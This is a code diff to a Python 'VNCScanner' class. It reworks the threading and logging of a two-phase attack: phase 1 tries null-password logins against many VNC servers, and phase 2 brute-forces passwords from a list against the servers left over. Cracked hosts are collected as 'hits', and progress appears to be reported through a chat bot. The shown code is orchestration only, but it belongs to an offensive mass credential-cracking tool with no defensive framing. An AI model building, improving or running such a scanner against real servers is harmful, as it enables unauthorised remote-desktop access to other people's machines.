@@ -301,7 +301,6 @@ class VNCScanner:
                 hits = len(self.results)
                 current_pwd = self.current_password
                 active = self.active_threads
-                phase = self.phase
             elapsed = time.time() - self.start_time
             
             if current_pwd:
@@ -342,7 +341,7 @@ class VNCScanner:
         if os.path.exists(self.results_file):
             os.remove(self.results_file)
         
-        print(f"Starting two-phase scan with {len(ips)} servers and {len(self.passwords)} passwords")
+        print(f"[SCAN START] {len(ips)} servers, {len(self.passwords)} passwords")
         
         text = (
             f"<b>SCAN STARTED</b>\n\n"
@@ -362,7 +361,10 @@ class VNCScanner:
         )
         self.message_id = msg.message_id
         
+        update_task = asyncio.create_task(self.update_progress())
+        
         # PHASE 1: NULL PASSWORD SCAN
+        print(f"[PHASE 1] Starting null scan...")
         self.phase = "NULL_SCAN"
         threads = []
         for _ in range(self.scan_threads):
@@ -375,29 +377,24 @@ class VNCScanner:
             if not self.running:
                 break
             self.queue.put(ip_info)
-            
-        update_task = asyncio.create_task(self.update_progress())
         
-        while self.running and (not self.queue.empty() or any(t.is_alive() for t in threads)):
-            await asyncio.sleep(0.5)
+        # Wait for queue to empty
+        self.queue.join()
         
+        # Stop null workers
         for _ in range(self.scan_threads):
-            try:
-                self.queue.put(None)
-            except:
-                pass
+            self.queue.put(None)
         
         for t in threads:
-            t.join(timeout=2)
+            t.join(timeout=3)
         
-        print(f"Phase 1 complete: {len(self.cracked_ips)} null hits, {len(self.null_servers)} need brute force")
+        print(f"[PHASE 1 DONE] Null hits: {len(self.cracked_ips)}, Need brute: {len(self.null_servers)}")
         
         # PHASE 2: BRUTE FORCE
         if self.running and len(self.null_servers) > 0 and len(self.passwords) > 0:
+            print(f"[PHASE 2] Starting brute force on {len(self.null_servers)} servers...")
             self.phase = "BRUTE_FORCE"
             self.checked_servers = 0
-            
-            print(f"Phase 2: Brute forcing {len(self.null_servers)} servers")
             
             threads = []
             for _ in range(self.scan_threads):
@@ -405,35 +402,36 @@ class VNCScanner:
                 t.daemon = True
                 t.start()
                 threads.append(t)
-                
+            
             for ip_info in self.null_servers:
                 if not self.running:
                     break
                 self.brute_queue.put(ip_info)
-                
-            while self.running and (not self.brute_queue.empty() or any(t.is_alive() for t in threads)):
-                await asyncio.sleep(0.5)
             
+            # Wait for brute queue
+            self.brute_queue.join()
+            
+            # Stop brute workers
             for _ in range(self.scan_threads):
-                try:
-                    self.brute_queue.put(None)
-                except:
-                    pass
+                self.brute_queue.put(None)
             
             for t in threads:
-                t.join(timeout=2)
+                t.join(timeout=3)
+            
+            print(f"[PHASE 2 DONE] Total hits: {len(self.results)}")
+        else:
+            print(f"[PHASE 2 SKIP] No servers to brute or no passwords")
         
         self.running = False
         
         try:
             update_task.cancel()
-            await asyncio.sleep(0.1)
         except:
             pass
         
         elapsed = time.time() - self.start_time
         
-        print(f"Scan finished: {len(self.results)} hits in {elapsed:.2f}s")
+        print(f"[SCAN COMPLETE] {len(self.results)} hits in {elapsed:.2f}s")
         
         if self.stopped:
             text = (
